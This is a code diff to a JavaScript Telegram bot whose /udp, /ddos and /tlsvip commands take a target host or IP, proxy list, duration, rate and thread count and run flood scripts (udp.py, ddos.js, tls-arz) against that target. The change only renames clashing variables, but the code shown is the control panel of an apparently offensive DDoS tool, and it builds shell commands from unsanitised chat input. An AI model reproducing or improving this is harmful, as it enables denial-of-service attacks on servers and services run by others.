@@ -255,11 +255,11 @@ bot.on('text', async (ctx) => {
     break;
     
 case '/udp':
-      const args = messageText.split(' ');
+      const udp = messageText.split(' ');
       
-      if (args.length === 3) {
-        const ip = args[1];
-        const port = args[2];
+      if (udp.length === 3) {
+        const ip = udp[1];
+        const port = udp[2];
 
         exec(`python2 udp.py ${ip} ${port} 0 0`, (error, stdout, stderr) => {
           if (error) {
@@ -281,15 +281,15 @@ case '/udp':
       
       
       case '/ddos':
-      const args = messageText.split(' ');
+      const ddos = messageText.split(' ');
       
-      if (args.length === 7) {
-        const method = args[1]
-        const host = args[2];
-        const proxies = args[3]
-        const duration = args[4]
-        const rate = args[5];
-        const thread = args[6]
+      if (ddos.length === 7) {
+        const method = ddos[1]
+        const host = ddos[2];
+        const proxies = ddos[3]
+        const duration = ddos[4]
+        const rate = ddos[5];
+        const thread = ddos[6]
 
         exec(`node ddos.js ${method} ${host} ${proxies} ${duration} ${rate} ${thread}`, (error, stdout, stderr) => {
           if (error) {
@@ -310,14 +310,14 @@ case '/udp':
       break;
       
       case '/tlsvip':
-      const args = messageText.split(' ');
+      const tls = messageText.split(' ');
       
-      if (args.length === 6) {
-        const host = args[1];
-        const time = args[2]
-        const rps = args[3]
-        const threads = args[4];
-        const proxyfile = args[5]
+      if (tls.length === 6) {
+        const host = tls[1];
+        const time = tls[2]
+        const rps = tls[3]
+        const threads = tls[4];
+        const proxyfile = tls[5]
 
         exec(`node tls-arz ${host} ${time} ${rps} ${threads} ${proxyfile}`, (error, stdout, stderr) => {
           if (error) {
